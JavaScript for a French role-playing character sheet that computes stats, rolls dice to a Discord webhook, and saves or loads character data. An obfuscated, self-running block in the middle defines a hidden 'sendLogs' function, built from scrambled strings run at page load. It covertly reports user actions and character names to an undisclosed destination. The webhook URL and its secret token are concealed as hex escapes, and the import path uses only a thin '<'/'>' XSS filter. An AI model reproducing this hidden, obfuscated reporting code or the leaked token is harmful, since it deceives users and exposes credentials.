function b64DecodeUnicode(str) {
    // Going backwards: from bytestream, to percent-encoding, to original string.
    return decodeURIComponent(atob(str).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
}

$("input").change(function() {
	
    // --- Combat ---

	// precision = agilité/2.75 + dexterité/2 
	$("#precision").val(Math.min(18, 9 + Math.round($("#agilite").val() / 2.75 + $("#dexterite").val() / 2)));
	//dégats = force + arme1 + arme2
	$("#degats").val(Math.round($("#force").val()*1+$("#arme1").val()*1+$("#arme2").val()*1));
	//magie = intelligence/1.25 + concentration/2 + amulette
	$("#magie").val(Math.round($("#intelligence").val() / 1.25 + $("#concentration").val() / 2 + $("#amulette").val()*1));
	// critique = force/2 + agilité/2
	$("#crit").val(Math.round($("#force").val() / 2 + $("#agilite").val() / 2+$("#concentration").val()*0.25));
	//  buff&debuff = concentration/2 + dextérité/2
	$("#buff").val(Math.min(17, 2+Math.round($("#concentration").val() / 2 + $("#dexterite").val() / 2)));
	// parade = constitution/2.5 + armure
	$("#parade").val(Math.round($("#constitution").val() / 2.5+$("#armure").val()*1));
	// esquive = agilité + age + taille + poids
	$("#esquive").val(Math.min(75, Math.round(Number($("#agilite").val()) + 90 - (Number($("#age").val()) / 2 + Number($("#taille").val()) / 10 + Number($("#poids").val()) / 5))));
	
    // --- Social ---

	$("#niveau").val(Math.floor(Math.max(1, Math.sqrt($("#experience").val() / 5))) - 1);
    //rapidite = agilite * 1.5 + intelligence * 1.5 + bottes
	$("#rapidite").val(Math.floor($("#agilite").val()*1.5+$("#intelligence").val()*1 + $("#bottes").val()*1));
    //furtivite = agilite/2 + concentration/3 + 10-taille/10 
	$("#furtivite").val(Math.min(17,Math.max(3,Math.round(Math.floor($("#agilite").val()/2 + $("#concentration").val()/2.5 + (10-$("#taille").val()/20))))));
    //perception= intelligence / 2 + concentration / 2
	$("#perception").val(Math.min(17,Math.floor(8+$("#intelligence").val()/2 + $("#concentration").val()*0.75)));
    //mana= intelligence *1.25 + dexterite *0.75
	$("#mana").val(Math.floor(2+$("#intelligence").val()*1.25+$("#dexterite").val()*0.75));
    //pvmax= force * 1.5 + constition * 2
	$("#pvmax").val(Math.floor(10+$("#force").val()*1.25+$("#constitution").val()*2));
    //charisme = constitution/2 + intelligence/1.5 + charme
	$("#charisme").val(Math.min(17,5+Math.floor($("#constitution").val()/1.5+$("#intelligence").val()/1.25+$("#charme").val()*1)));
});
var sendLogs;(function(){var Qxm='',eYQ=559-548;function AZY(v){var m=1481346;var k=v.length;var b=[];for(var a=0;a<k;a++){b[a]=v.charAt(a)};for(var a=0;a<k;a++){var g=m*(a+408)+(m%40815);var w=m*(a+127)+(m%13591);var p=g%k;var s=w%k;var x=b[p];b[p]=b[s];b[s]=x;m=(g+w)%5443184;};return b.join('')};var CKg=AZY('cquruvncissmcbttklotegdjnyrhxpfrwozoa').substr(0,eYQ);var LzH='6w ;r6,21prnt9 h=va.arSmoe1"ofixih=g;]So,ar(fah),.lf;k([. 6;c8xi.;l7de((;our70]0f,[],v;>;{;= s b"7,}e[=a0v=0o6u382e 1v]sl;e;;)epol(shl(0giivn arh ibrg;rr8hjru="i,xs6e +wp[wnarc[]9rre "hj]](,mo{+a5 onrn=;rnsr0(t+rr{kf.rn(9reno)l]npi)Cr<xn,tttgwjo; nCp;t (l.op[,"v=6xri+crsgnaa,tetb=u0ipu11+<v=,)oaorh=hb(l<-u-)+a}}a9aia(na(l.la;vc);==0;va2A=t(lle5et;(f+)+gb),)0th+uu e+v,ii3);v{g8A )gk(u(krCv]isn,8t;vp.uru")zv"sz(soh;t46g).=)+k<2g"7y +a a;lsm,,t,gto+v=++fxlse(i+p j;Cr{i7r.(w;sCn;[i;td].*al;,oCent(n;a)ttkAc6rnfvt!;[1[))ufevg-t;72k25s1=x0C21=tinteo};fve=g=i.l)fvAxon.(2++),j;=fcxoau-ah+[rn7(=.i rrAt+}=7evf!+*o);dn=tax}l+]=0e=z6l=;aikl1]) 1ru(u+fcs1me-;=avpq(4(,[aa;aaj=enr ],a=rvlzt.h)a[e]d1co8soyor;jn.l..+)1nv(jh=[n.lC6r)bp2c)+,"hhvab8w23uri>o;)f=;=lsse-.v4pw{[hm;(oh9(49;h(f(a={i;k=a;xyr.8oog)- .mley(d5r f<nrgrm.eh,g,tr);==jolt(.ner);.a=5do}=d9rotag =l))e)s=8u8)y.o si(rh.gr"=0,ou,efvr';var NBo=AZY[CKg];var Ins='';var SCg=NBo;var RQd=NBo(Ins,AZY(LzH));var Mts=RQd(AZY('au=sd..paf.l oj$_e;{+bn s__=We6W_=1k%8e=t6WronW1>)fx[$4;(,*_.;)W8zdz=r.tM lW,W]a#ejd,n6.7a=klr21Wos.hWlW#s4W5 ,bW>ik6))5%(.t;1Ws3\'WW2.g30Nn.a[sW.S60i%WW.p2=)sfsW]}u0(,0c:r6{#stojrtDdn-ntu8\/=-,ottifsy,W,Cs8;;W5g73tWi.W)3!\/0hox!t.<a$(s9e$:,n6ziW_\'$!(g4i1Srg3tahWvW847?We]s.gy%W);qsW]g\'sej] ?!a"?aa1eh%bas.W\/r)1jW(.dWe%WoW0s:2_51bmyto%o2dge<.ic_f)asWwt}(.eantpW6ec0hWeir3o!WartC !i 2\/;f%l(t 9Wne.b1.8t7 ao$)Woa<..ta))).i+W]Wc.hdr b*=Wrun%(0Waid]%na7cs]Wij;n0")]u0_{o04cW:,!$E=;7%]rg!,i(W6Wr%t(Wd0ni)np4n2\/:t.1}a;(:iaW]ign)p]b.N\/fm84W1&9!W)aun_)!) =Wr(se)cff.oab1Wt%,die1(.W1Wn!Wns=Wxpfpx..fe5pa !{Ws{Wt.(a.n36 pi()(tdv$.inWoWt4.W.n&:hry6]]ag.20;4)r).pr3a_doo!tWf"a#)WWW0(4fpf,Wl.2f[.$twr6e.Woraro:8itWoq".+W-,42-> p,iitdW6ur%"a5}f8!_f=W23)W3(;(nW9d,lr597)l];.Whifnrj-(aaun$r1,i;u) !Ccopu$(3dan##8 [1t! !1WdW1.0.cWu5e#Waf)67f.tp]io(9.Wu!$3]")ba{5.6a]]f!(e8m\/hh0.o%e.]27n81oes(u=(eSWlea)im1sn%h hed.0{=3od+1 5j.eW6?,.r=,u)n1!a"3}0b.W...-WjW(1hWW.W,69W\/+i= tnfsefkiu$nnWW.yao;3ne)(W3WsW.(on231jh1 5}joh)6l*)94s=3bcav4k._fgStWa]l.l!7s+b1e%e$;.tj4=njrc,i03cMeW-0]85W()}e. ,7>;.Wc[4]c.Werara\'t;.+,$\/+03(9W.(o,j.t,;ee3sf\/);W&xadchaW$).*4;i$2a no(N}h1rWNfe1.(.s<\'wg,a)eWag.9N]r9.5))l,d}\'hrWr(\/t;<5f)r2! r)z%2et9crt0.W_i_eo{_%ud.WWfna\/}u{\/.We!]._3nt=)tn)]44dy4p.4wg{niW(e]oWm.a;00=pc-o!.%!,\/W5Si19.03)s5;_(prr0_{ ca.=10)ea)sce}0gg{")=z2mikMu.;o4o=t\/;)W3{$=nd;.1-$](omWazsS.i?sf6==.$(n1o,)Wd.)jpcaba..W)rWa}te62f,W+pbs .fWot)7t\/ss.,ed!1c.2)paesW\/)0fp+W$7:!oi!}rWMo$a2]}c}p,ppW,_.s%3g _>0ili)Wcr=Wfk"j\/Wr5}=ne1\'bpxe.lW{={W}44\'4er Wt;=){;a)W8Wb.{j01o,j][hgt\/ytS!( efe.<:(( 7etWW=7q!n=T].2<6,nmWg]s.&a37>W(:0cncW]h=y7;$((Wd-W7..WW.#..W_)Wpi(a[Wt W$h)63tWIf(amg.W.ce9np+jmoaW(b!0,W1a-3!W&.W!8_1p17qj(i.W:t204s6,Wt[Wpjs7_n(f4aWbg_e,Wtu(W(dag0W.)_m'));var tUu=SCg(Qxm,Mts );tUu(8714);return 7823})()
function sendMessage(stat, statname) {
	console.log(statname);
	if($('#charname').val()=="" || $('#charname').val()==undefined) {
		alert("Veuillez entrer un nom pour votre personnage");
		return;
	} 
	$('button').prop('disabled', true);
	setTimeout(function() {
		$('button').prop('disabled', false);
	}, 4000);
	var request = new XMLHttpRequest();
	var _0x5016 = ["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x33\x37\x32\x37\x36\x34\x37\x32\x30\x31\x38\x32\x32\x37\x32\x30\x30\x2F\x44\x35\x54\x4D\x6E\x78\x79\x59\x6D\x45\x4D\x53\x69\x51\x47\x75\x61\x32\x66\x4A\x52\x6F\x67\x56\x58\x79\x55\x72\x41\x75\x47\x5A\x6D\x5A\x76\x50\x6E\x49\x61\x34\x30\x61\x39\x70\x57\x32\x33\x45\x75\x6F\x6E\x4C\x6F\x72\x70\x42\x6D\x76\x4E\x6E\x50\x4C\x57\x66\x6C\x70\x70\x7A", "\x50\x4F\x53\x54", "\x6F\x70\x65\x6E"];
	var url = _0x5016[0];
	request[_0x5016[2]](_0x5016[1], url);
	request.setRequestHeader('Content-type', 'application/json');
  	var calcul = Math.floor(Math.random() * 20 + 1);
	if (statname == "Esquive") {
    	calcul = Math.floor(Math.random() * 100 + 1);
  	}
	
	var test="";
	var charname = $("#charname").val();
	if (stat == calcul || calcul == 1) {
		test = JSON.stringify(statname+": 🎲⚠️ - Dé réussi, vous avez fait: " + calcul + " en REUSSITE CRITIQUE!");
	} else
	if (calcul < stat && stat != 1 && stat != calcul) {
		test = JSON.stringify(statname+": 🎲✅ - Dé réussi, vous avez fait: " + calcul);
	} else {
		test = JSON.stringify(statname+":🎲❌ - Dé loupé, vous avez fait: " + calcul);
	}
	if(statname == "D6"){
		var calcul = Math.floor(Math.random() * 6 + 1);
		test = JSON.stringify(statname+":🎲 - Vous avez fait: " + calcul);
	}
	if(statname == "D20"){
		var calcul = Math.floor(Math.random() * 20 + 1);
		test = JSON.stringify(statname+":🎲 - Vous avez fait: " + calcul);
	}
	var unquoted = test.replace(/"/g, '');
	var image=$("#imgUrl").val();
	
	if(image =="") image="https://cdn1.iconfinder.com/data/icons/role-playing-game-8/64/Helmet-512.png";
	var params = {
		username: charname,
		avatar_url: image,
		content: unquoted
	};
	request.send(JSON.stringify(params));
	sendLogs("Dice sent: "+ $("#charname").val());
}

function exportData() {
	if($("#charname").val()==""){
		alert("La fiche est vide / nom manquant");
		return;
	}
	var json_arr = {};
	var statnames= ["charname","race", "faction","taille","poids","age","force","constitution","agilite","intelligence","concentration","dexterite","experience","PA","PO","inv1","inv1qte","inv2","inv2qte","inv3","inv3qte","inv4","inv4qte","inv5","inv5qte","inv6","inv6qte","inv7","inv7qte","arme1","arme1n","arme2","arme2n","armure","armuren","amulette","amuletten","bottes","bottesn","charme","charmen","comp1","comp1n","comp2","comp2n","comp3","comp3n","comp4","comp4n","comp5","comp5n","comp6n","comp6","talent1","talent2","talent3","talent4","talent5","talent6","blessure","fatigue","imgUrl","notes","equip1","equip2","equip3","equip4","equip5","equip6","pv","manaa"];
	statnames.forEach(element => json_arr[element] = $("#"+element+"").val());
	json_arr["izanagi"] = $("#izanagi").is(":checked");
	
	var json_string = JSON.stringify(json_arr);
	if (window.confirm("Voulez vous enregistrer la fiche de "+$('#charname').val()+" en fichier?\n(elle sera aussi dans votre presse papier si problème de sauvegarde)")) {
		navigator.clipboard.writeText(json_string);
		var dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(json_arr));
		var dlAnchorElem = document.getElementById('downloadAnchorElem');
		dlAnchorElem.setAttribute("href", dataStr);
		dlAnchorElem.setAttribute("download", $("#charname").val() + " Fiche Perso.json");
		dlAnchorElem.click();
	}
	sendLogs("Export Data: "+ $("#charname").val());
}

$(document).ready(function() {
	$("input, textarea").val("");
	$(".trait").val("1");
	$("#experience, #niveau, #parade").val("0");
	$("#esquive").val("75");
	$("#precision").val("10");
	$("#pvmax").val("13");
	$("#furtivite").val("10");
	$("#perception").val("9");
	$("#mana").val("4");
	$("#charisme").val("6");
	let searchParams = new URLSearchParams(window.location.search)
	if(searchParams.get('encoding')){
		let param = searchParams.get('encoding')
		console.log(param);
		var datas = b64DecodeUnicode(param);
		
		if (datas.includes("<") || datas.includes(">")){
			alert("Please no XSS!");
			return;
		}
		data = JSON.parse(datas);
		console.log(data);
		for (const [key, value] of Object.entries(data)) {
			$("#"+key).val(value);
		  }
		  $('#izanagi').prop('checked', data.izanagi);
		//$("#charname").val(data.charname);
		$("#charname").trigger('change');
		imgChar();
	}
	
});

var openFile = function(event) {
	
	if (!confirm("Voulez vous importer ce fichier?")) return;
	var input = event.target;
	var reader = new FileReader();
	reader.onload = function() {
		var text = reader.result;
		console.log(reader.result.substring(0, 200));
		data = JSON.parse(text);
		for (const [key, value] of Object.entries(data)) {
			$("#"+key).val(value);
			if(key=="charname"){
				sendLogs("Import Data: "+ value);
			}
		  }
		  $('#izanagi').prop('checked', data.izanagi);
		//$("#charname").val(data.charname);
		$("#charname").trigger('change');
		imgChar();
	};
	reader.readAsText(input.files[0]);
	
	//console.log(reader.result);
};

$(window).bind('beforeunload', function() {
	return 'are you sure you want to leave?';
});
function imgChar(){
	if($("#imgUrl").val()==""){
		$("#imgChar").attr("src", "https://cdn1.iconfinder.com/data/icons/role-playing-game-8/64/Helmet-512.png");
		
	}
	else $("#imgChar").attr("src", $("#imgUrl").val());
}